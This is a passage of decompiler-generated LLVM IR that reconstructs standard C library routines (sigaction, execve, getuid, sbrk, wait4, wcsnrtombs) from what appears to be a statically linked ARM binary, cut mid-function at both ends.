  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139d8, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_138a8, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_13890, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_13a60 = load i32, i32* @r4, align 4
  %v6_13a60 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_13a64 = icmp eq i32* %arg2, null
  %v2_13a68 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_13a64, label %dec_label_pc_13ad4, label %dec_label_pc_13a78

dec_label_pc_13a78:                               ; preds = %entry
  %v2_13a7c = load i32, i32* %arg2, align 4
  %v4_13a7c = add i32 %tmp, 4
  store i32 %v4_13a7c, i32* @r1, align 4
  %v2_13a80 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_13a80, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_13a7c, i32* %stack_var_-156, align 4
  %v0_13a8c = call i32 @memcpy()
  store i32 %v0_13a8c, i32* %r0.global-to-local, align 4
  %v0_13a90 = load i32, i32* @r4, align 4
  %v1_13a90 = add i32 %v0_13a90, 132
  %v2_13a90 = inttoptr i32 %v1_13a90 to i32*
  %v3_13a90 = load i32, i32* %v2_13a90, align 4
  %v1_13a94 = and i32 %v3_13a90, 67108864
  %v2_13a94 = icmp eq i32 %v1_13a94, 0
  br i1 %v2_13a94, label %dec_label_pc_13aa8, label %bb

bb:                                               ; preds = %dec_label_pc_13a78
  br label %dec_label_pc_13ac4

dec_label_pc_13aa8:                               ; preds = %dec_label_pc_13a78
  %v1_13ab0 = and i32 %v3_13a90, 4
  %v2_13ab0 = icmp eq i32 %v1_13ab0, 0
  br i1 %v2_13ab0, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_13aa8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13aa8, %bb20
  br label %dec_label_pc_13ac4

dec_label_pc_13ac4:                               ; preds = %bb, %bb21
  %v2_13ac4 = icmp eq i32 %v0_13a90, 0
  %v3_13ac8 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_13ac8 = select i1 %v2_13ac4, i32 0, i32 %v3_13ac8
  %v0_13ad4.pre = load i32, i32* @r5, align 4
  %v0_13ae4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13ad4

dec_label_pc_13ad4:                               ; preds = %dec_label_pc_13ac4, %entry
  %v0_13ae4 = phi i32 [ %arg1, %entry ], [ %v0_13ae4.pre, %dec_label_pc_13ac4 ]
  %v0_13ad4 = phi i32 [ %arg3, %entry ], [ %v0_13ad4.pre, %dec_label_pc_13ac4 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_13ac8, %dec_label_pc_13ac4 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_13ad4 = icmp eq i32 %v0_13ad4, 0
  %.v2_13a68 = select i1 %v2_13ad4, i32 0, i32 %v2_13a68
  store i32 %.v2_13a68, i32* @r2, align 4
  store i32 %v0_13ae4, i32* %r0.global-to-local, align 4
  %v1_13ae8 = call i32 @__syscall_rt_sigaction(i32 %v0_13ae4)
  store i32 %v1_13ae8, i32* %r0.global-to-local, align 4
  %v0_13aec = load i32, i32* @r5, align 4
  %v2_13aec = icmp eq i32 %v0_13aec, 0
  br i1 %v2_13aec, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_13ad4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_13ad4, %bb25
  %v0_13afc.pr = phi i32 [ 0, %dec_label_pc_13ad4 ], [ 1, %bb25 ]
  %v1_13af4 = icmp slt i32 %v1_13ae8, 0
  br i1 %v1_13af4, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_13b30

thread-pre-split:                                 ; preds = %bb26
  %v2_13afc = icmp eq i32 %v0_13afc.pr, 0
  store i32 %v1_13ae8, i32* @r4, align 4
  br i1 %v2_13afc, label %dec_label_pc_13b30, label %dec_label_pc_13b08

dec_label_pc_13b08:                               ; preds = %thread-pre-split
  %v2_13b08 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_13aec, i32* %r0.global-to-local, align 4
  %v2_13b10 = inttoptr i32 %v0_13aec to i32*
  store i32 %v2_13b08, i32* %v2_13b10, align 4
  %v3_13b10 = load i32, i32* %r0.global-to-local, align 4
  %v4_13b10 = add i32 %v3_13b10, 4
  store i32 %v4_13b10, i32* @r0, align 4
  %v2_13b14 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_13b14, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13b1c = call i32 @memcpy()
  store i32 %v0_13b1c, i32* %r0.global-to-local, align 4
  %v1_13b24 = load i32, i32* @r5, align 4
  %v2_13b24 = add i32 %v1_13b24, 136
  %v3_13b24 = inttoptr i32 %v2_13b24 to i32*
  %v1_13b2c = load i32, i32* @r5, align 4
  %v2_13b2c = add i32 %v1_13b2c, 132
  %v3_13b2c = inttoptr i32 %v2_13b2c to i32*
  %v0_13b30.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13b30

dec_label_pc_13b30:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_13b08
  %v0_13b30 = phi i32 [ %v1_13ae8, %thread-pre-split ], [ %v0_13b30.pre, %dec_label_pc_13b08 ], [ %v1_13ae8, %thread-pre-split.thread ]
  store i32 %v0_13b30, i32* %r0.global-to-local, align 4
  store i32 %v3_13a60, i32* @r4, align 4
  store i32 %v6_13a60, i32* @r5, align 4
  ret i32 %v0_13b30

; uselistorder directives
  uselistorder i32 %v0_13b30, { 1, 0 }
  uselistorder i32 %v0_13aec, { 1, 0, 2 }
  uselistorder i32 %v0_13ae4, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_13b30, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_13ac4, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_13b44 = load i32, i32* @r4, align 4
  store i32 %v3_13b44, i32* %stack_var_-8, align 4
  %v0_13b48 = load i32, i32* @r0, align 4
  %v0_13b4c = call i32 @__errno_location()
  %v1_13b50 = sub i32 0, %v0_13b48
  %v2_13b54 = inttoptr i32 %v0_13b4c to i32*
  store i32 %v1_13b50, i32* %v2_13b54, align 4
  %v2_13b5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13b5c, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_13b60 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_13b60
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_13b64 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_13b64
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b68 = load i32, i32* @r4, align 4
  store i32 %v3_13b68, i32* %stack_var_-8, align 4
  %v1_13b6c = load i32, i32* @r1, align 4
  %v2_13b6c = inttoptr i32 %v1_13b6c to %sigaction*
  %v3_13b6c = load i32, i32* @r2, align 4
  %v4_13b6c = inttoptr i32 %v3_13b6c to %sigaction*
  %v5_13b6c = call i32 @sigaction(i32 %arg1, %sigaction* %v2_13b6c, %sigaction* %v4_13b6c)
  store i32 %v5_13b6c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13b6c, -4095
  br i1 %tmp, label %dec_label_pc_13b8c, label %dec_label_pc_13b7c

dec_label_pc_13b7c:                               ; preds = %entry
  %v0_13b7c = call i32 @__errno_location()
  %v0_13b80 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b80 = sub i32 0, %v0_13b80
  %v2_13b84 = inttoptr i32 %v0_13b7c to i32*
  store i32 %v1_13b80, i32* %v2_13b84, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b8c

dec_label_pc_13b8c:                               ; preds = %entry, %dec_label_pc_13b7c
  %v0_13b8c = phi i32 [ %v5_13b6c, %entry ], [ -1, %dec_label_pc_13b7c ]
  %v2_13b90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13b90, i32* %r4.global-to-local, align 4
  ret i32 %v0_13b8c

; uselistorder directives
  uselistorder i32 %v5_13b6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b8c, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b94 = load i32, i32* @r4, align 4
  store i32 %v3_13b94, i32* %stack_var_-8, align 4
  %v0_13b98 = load i32, i32* @r0, align 4
  %v1_13b98 = inttoptr i32 %v0_13b98 to i8*
  %v2_13b98 = load i32, i32* @r1, align 4
  %v3_13b98 = inttoptr i32 %v2_13b98 to i8*
  %v4_13b98 = insertvalue [1 x i8*] undef, i8* %v3_13b98, 0
  %v5_13b98 = load i32, i32* @r2, align 4
  %v6_13b98 = inttoptr i32 %v5_13b98 to i8*
  %v7_13b98 = insertvalue [1 x i8*] undef, i8* %v6_13b98, 0
  %v8_13b98 = call i32 @execve(i8* %v1_13b98, [1 x i8*] %v4_13b98, [1 x i8*] %v7_13b98)
  store i32 %v8_13b98, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_13b98, -4095
  br i1 %tmp, label %dec_label_pc_13bb8, label %dec_label_pc_13ba8

dec_label_pc_13ba8:                               ; preds = %entry
  %v0_13ba8 = call i32 @__errno_location()
  %v0_13bac = load i32, i32* %r4.global-to-local, align 4
  %v1_13bac = sub i32 0, %v0_13bac
  %v2_13bb0 = inttoptr i32 %v0_13ba8 to i32*
  store i32 %v1_13bac, i32* %v2_13bb0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13bb8

dec_label_pc_13bb8:                               ; preds = %entry, %dec_label_pc_13ba8
  %v0_13bb8 = phi i32 [ %v8_13b98, %entry ], [ -1, %dec_label_pc_13ba8 ]
  %v2_13bbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13bbc, i32* @r4, align 4
  ret i32 %v0_13bb8

; uselistorder directives
  uselistorder i32 %v8_13b98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13bb8, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13bc0 = load i32, i32* @r4, align 4
  store i32 %v3_13bc0, i32* %stack_var_-8, align 4
  %v0_13bc8 = load i32, i32* @r0, align 4
  store i32 %v0_13bc8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13bc8, -4095
  br i1 %tmp, label %dec_label_pc_13be4, label %dec_label_pc_13bd4

dec_label_pc_13bd4:                               ; preds = %entry
  %v0_13bd4 = call i32 @__errno_location()
  %v0_13bd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13bd8 = sub i32 0, %v0_13bd8
  %v2_13bdc = inttoptr i32 %v0_13bd4 to i32*
  store i32 %v1_13bd8, i32* %v2_13bdc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13be8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %entry, %dec_label_pc_13bd4
  %v2_13be8 = phi i32 [ %v3_13bc0, %entry ], [ %v2_13be8.pre, %dec_label_pc_13bd4 ]
  %v0_13be4 = phi i32 [ %v0_13bc8, %entry ], [ -1, %dec_label_pc_13bd4 ]
  store i32 %v2_13be8, i32* @r4, align 4
  ret i32 %v0_13be4

; uselistorder directives
  uselistorder i32 %v0_13bc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13be4, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13bec = load i32, i32* @r4, align 4
  store i32 %v3_13bec, i32* %stack_var_-8, align 4
  %v0_13bf4 = load i32, i32* @r0, align 4
  store i32 %v0_13bf4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13bf4, -4095
  br i1 %tmp, label %dec_label_pc_13c10, label %dec_label_pc_13c00

dec_label_pc_13c00:                               ; preds = %entry
  %v0_13c00 = call i32 @__errno_location()
  %v0_13c04 = load i32, i32* %r4.global-to-local, align 4
  %v1_13c04 = sub i32 0, %v0_13c04
  %v2_13c08 = inttoptr i32 %v0_13c00 to i32*
  store i32 %v1_13c04, i32* %v2_13c08, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13c14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %entry, %dec_label_pc_13c00
  %v2_13c14 = phi i32 [ %v3_13bec, %entry ], [ %v2_13c14.pre, %dec_label_pc_13c00 ]
  %v0_13c10 = phi i32 [ %v0_13bf4, %entry ], [ -1, %dec_label_pc_13c00 ]
  store i32 %v2_13c14, i32* @r4, align 4
  ret i32 %v0_13c10

; uselistorder directives
  uselistorder i32 %v0_13bf4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c10, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c18 = load i32, i32* @r4, align 4
  store i32 %v3_13c18, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13c3c, label %dec_label_pc_13c2c

dec_label_pc_13c2c:                               ; preds = %entry
  %v0_13c2c = call i32 @__errno_location()
  %v0_13c30 = load i32, i32* %r4.global-to-local, align 4
  %v1_13c30 = sub i32 0, %v0_13c30
  %v2_13c34 = inttoptr i32 %v0_13c2c to i32*
  store i32 %v1_13c30, i32* %v2_13c34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13c40.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c3c

dec_label_pc_13c3c:                               ; preds = %entry, %dec_label_pc_13c2c
  %v2_13c40 = phi i32 [ %v3_13c18, %entry ], [ %v2_13c40.pre, %dec_label_pc_13c2c ]
  %v0_13c3c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_13c2c ]
  store i32 %v2_13c40, i32* %r4.global-to-local, align 4
  ret i32 %v0_13c3c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c3c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c44 = load i32, i32* @r4, align 4
  store i32 %v3_13c44, i32* %stack_var_-8, align 4
  %v0_13c4c = load i32, i32* @r0, align 4
  store i32 %v0_13c4c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13c4c, -4095
  br i1 %tmp, label %dec_label_pc_13c68, label %dec_label_pc_13c58

dec_label_pc_13c58:                               ; preds = %entry
  %v0_13c58 = call i32 @__errno_location()
  %v0_13c5c = load i32, i32* %r4.global-to-local, align 4
  %v1_13c5c = sub i32 0, %v0_13c5c
  %v2_13c60 = inttoptr i32 %v0_13c58 to i32*
  store i32 %v1_13c5c, i32* %v2_13c60, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13c6c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c68

dec_label_pc_13c68:                               ; preds = %entry, %dec_label_pc_13c58
  %v2_13c6c = phi i32 [ %v3_13c44, %entry ], [ %v2_13c6c.pre, %dec_label_pc_13c58 ]
  %v0_13c68 = phi i32 [ %v0_13c4c, %entry ], [ -1, %dec_label_pc_13c58 ]
  store i32 %v2_13c6c, i32* %r4.global-to-local, align 4
  ret i32 %v0_13c68

; uselistorder directives
  uselistorder i32 %v0_13c4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c68, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_13c70 = load i32, i32* @r4, align 4
  store i32 %v3_13c70, i32* %stack_var_-8, align 4
  %v6_13c74 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_13c74, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_13c74, -4095
  br i1 %tmp6, label %dec_label_pc_13c94, label %dec_label_pc_13c84

dec_label_pc_13c84:                               ; preds = %entry
  %v0_13c84 = call i32 @__errno_location()
  %v0_13c88 = load i32, i32* %r4.global-to-local, align 4
  %v1_13c88 = sub i32 0, %v0_13c88
  %v2_13c8c = inttoptr i32 %v0_13c84 to i32*
  store i32 %v1_13c88, i32* %v2_13c8c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c94

dec_label_pc_13c94:                               ; preds = %entry, %dec_label_pc_13c84
  %v0_13c94 = phi i32 [ %v6_13c74, %entry ], [ -1, %dec_label_pc_13c84 ]
  %v2_13c98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13c98, i32* %r4.global-to-local, align 4
  ret i32 %v0_13c94

; uselistorder directives
  uselistorder i32 %v6_13c74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c94, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13c9c = load i32, i32* @r4, align 4
  store i32 %v3_13c9c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2a3ec.845 to i32), i32* %r4.global-to-local, align 4
  %v2_13ca4 = load i32, i32* @global_var_2a3ec.845, align 4
  %v2_13ca8 = icmp eq i32 %v2_13ca4, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13ca8, label %dec_label_pc_13cb8, label %dec_label_pc_13cc4

dec_label_pc_13cb8:                               ; preds = %entry
  %v2_13cb8 = call i32 @__GI_brk(i32* null)
  %v1_13cbc = icmp slt i32 %v2_13cb8, 0
  br i1 %v1_13cbc, label %dec_label_pc_13ce4, label %dec_label_pc_13cc4thread-pre-split

dec_label_pc_13cc4thread-pre-split:               ; preds = %dec_label_pc_13cb8
  %v0_13cc8.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_13cc4.pre = load i32, i32* @global_var_2a3ec.845, align 4
  br label %dec_label_pc_13cc4

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13cc4thread-pre-split, %entry
  %v2_13cc4 = phi i32 [ %v2_13cc4.pre, %dec_label_pc_13cc4thread-pre-split ], [ %v2_13ca4, %entry ]
  %v1_13cd0 = phi i32 [ %v0_13cc8.pr, %dec_label_pc_13cc4thread-pre-split ], [ %arg1, %entry ]
  %v2_13cc8 = icmp eq i32 %v1_13cd0, 0
  store i32 %v2_13cc4, i32* %r4.global-to-local, align 4
  br i1 %v2_13cc8, label %dec_label_pc_13ce8, label %dec_label_pc_13cd8

dec_label_pc_13cd8:                               ; preds = %dec_label_pc_13cc4
  %v2_13cd0 = add i32 %v1_13cd0, %v2_13cc4
  %v1_13cd8 = inttoptr i32 %v2_13cd0 to i32*
  %v2_13cd8 = call i32 @__GI_brk(i32* %v1_13cd8)
  %v1_13cdc = icmp slt i32 %v2_13cd8, 0
  br i1 %v1_13cdc, label %dec_label_pc_13ce4, label %dec_label_pc_13cd8.dec_label_pc_13ce8_crit_edge

dec_label_pc_13cd8.dec_label_pc_13ce8_crit_edge:  ; preds = %dec_label_pc_13cd8
  %v0_13ce8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ce8

dec_label_pc_13ce4:                               ; preds = %dec_label_pc_13cd8, %dec_label_pc_13cb8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ce8

dec_label_pc_13ce8:                               ; preds = %dec_label_pc_13cd8.dec_label_pc_13ce8_crit_edge, %dec_label_pc_13cc4, %dec_label_pc_13ce4
  %v0_13ce8 = phi i32 [ %v0_13ce8.pre, %dec_label_pc_13cd8.dec_label_pc_13ce8_crit_edge ], [ %v2_13cc4, %dec_label_pc_13cc4 ], [ -1, %dec_label_pc_13ce4 ]
  %v2_13cec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13cec, i32* @r4, align 4
  ret i32 %v0_13ce8

; uselistorder directives
  uselistorder i32 %v2_13cc4, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 9, 10, 8, 11, 12, 13, 14, 15, 16, 22, 23, 20, 21, 19, 18, 17, 24, 25, 26, 2 }
  uselistorder label %dec_label_pc_13ce8, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13cf4 = load i32, i32* @r4, align 4
  store i32 %v3_13cf4, i32* %stack_var_-8, align 4
  %v0_13cf8 = call i32 @wait4()
  store i32 %v0_13cf8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13cf8, -4095
  br i1 %tmp, label %dec_label_pc_13d18, label %dec_label_pc_13d08

dec_label_pc_13d08:                               ; preds = %entry
  %v0_13d08 = call i32 @__errno_location()
  %v0_13d0c = load i32, i32* %r4.global-to-local, align 4
  %v1_13d0c = sub i32 0, %v0_13d0c
  %v2_13d10 = inttoptr i32 %v0_13d08 to i32*
  store i32 %v1_13d0c, i32* %v2_13d10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13d18

dec_label_pc_13d18:                               ; preds = %entry, %dec_label_pc_13d08
  %v0_13d18 = phi i32 [ %v0_13cf8, %entry ], [ -1, %dec_label_pc_13d08 ]
  %v2_13d1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13d1c, i32* @r4, align 4
  ret i32 %v0_13d18

; uselistorder directives
  uselistorder i32 %v0_13cf8, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_13d18, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2a3cc.847 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_13d30 = icmp eq i32 %arg1, 0
  br i1 %v2_13d30, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_13d38 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_13d60 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_13d54 = phi i32 [ %arg1, %.thread ], [ %v3_13d38, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_13d4c = ptrtoint i32* %stack_var_-16 to i32
  %v2_13d58 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_13d58, i32* %stack_var_-16, align 4
  store i32 %v0_13d60, i32* %stack_var_-12, align 4
  %v5_13d68 = inttoptr i32 %v0_13d54 to i8*
  %v6_13d68 = call i32 @__GI_wcsnrtombs(i8* %v5_13d68, i32 %v2_13d4c, i32 1, i32 16, i32 %arg3)
  %v2_13d6c = icmp eq i32 %v6_13d68, 0
  br i1 %v2_13d6c, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_13d78 = phi i32 [ %v6_13d68, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_13d78

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_13d88 = load i32, i32* @r2, align 4
  store i32 %v0_13d88, i32* @r3, align 4
  %v0_13d90 = load i32, i32* @r0, align 4
  %v1_13d90 = load i32, i32* @r1, align 4
  %v5_13d90 = inttoptr i32 %v0_13d90 to i8*
  %v6_13d90 = call i32 @__GI_wcsnrtombs(i8* %v5_13d90, i32 %v1_13d90, i32 -1, i32 %v0_13d88, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_13d90
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d9c = load i32, i32* @r4, align 4
  store i32 %v3_13d9c, i32* %stack_var_-8, align 4
  %v10_13da0 = icmp eq i32 %tmp, %arg2
  br i1 %v10_13da0, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_13da81 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13dbc

bb:                                               ; preds = %entry
  %v4_13da4 = icmp eq i8* %arg1, null
  %v0_13da8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_13da4, label %dec_label_pc_13dbc, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df8

dec_label_pc_13dbc:                               ; preds = %.thread, %bb
  %v1_13dfc.ph = phi i32 [ %v0_13da8, %bb ], [ %v0_13da81, %.thread ]
  %v2_13dac3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_13dbc = icmp eq i8* %arg1, null
  store i32 %v2_13dac3.ph, i32* @ip, align 4
  br i1 %v3_13dbc, label %.thread4, label %dec_label_pc_13df0

.thread4:                                         ; preds = %dec_label_pc_13dbc
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_13df8

dec_label_pc_13dd4:                               ; preds = %dec_label_pc_13e10
  %v0_13dd4 = call i32 @__errno_location()
  store i32 %v0_13dd4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13de0 = inttoptr i32 %v0_13dd4 to i32*
  store i32 84, i32* %v2_13de0, align 4
  %v0_13e4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13de8:                               ; preds = %dec_label_pc_13e20
  %v3_13e24 = zext i8 %v2_13e24 to i32
  store i32 %v3_13e24, i32* @lr, align 4
  br label %dec_label_pc_13e40

dec_label_pc_13df0:                               ; preds = %dec_label_pc_13dbc
  store i32 %v2_13dac3.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df8

dec_label_pc_13df8:                               ; preds = %bb27, %.thread4, %dec_label_pc_13df0
  %v1_13dfc20 = phi i32 [ %v0_13da8, %bb27 ], [ %v1_13dfc.ph, %.thread4 ], [ %v1_13dfc.ph, %dec_label_pc_13df0 ]
  %v2_13e2014 = phi i32 [ %tmp, %bb27 ], [ %v2_13dac3.ph, %.thread4 ], [ %v2_13dac3.ph, %dec_label_pc_13df0 ]
  %v1_13df8 = load i32, i32* @r3, align 4
  %v3_13df8 = icmp uge i32 %v1_13dfc20, %v1_13df8
  %v1_13df8.v1_13dfc20 = select i1 %v3_13df8, i32 %v1_13df8, i32 %v1_13dfc20
  store i32 %v1_13df8.v1_13dfc20, i32* %r4.global-to-local, align 4
  %v1_13e04 = inttoptr i32 %arg2 to i32*
  %v2_13e04 = load i32, i32* %v1_13e04, align 4
  store i32 %v2_13e04, i32* @lr, align 4
  store i32 %v1_13df8.v1_13dfc20, i32* %r0.global-to-local, align 4
  %v2_13e388 = icmp eq i32 %v1_13df8.v1_13dfc20, 0
  br i1 %v2_13e388, label %dec_label_pc_13e40, label %dec_label_pc_13e10

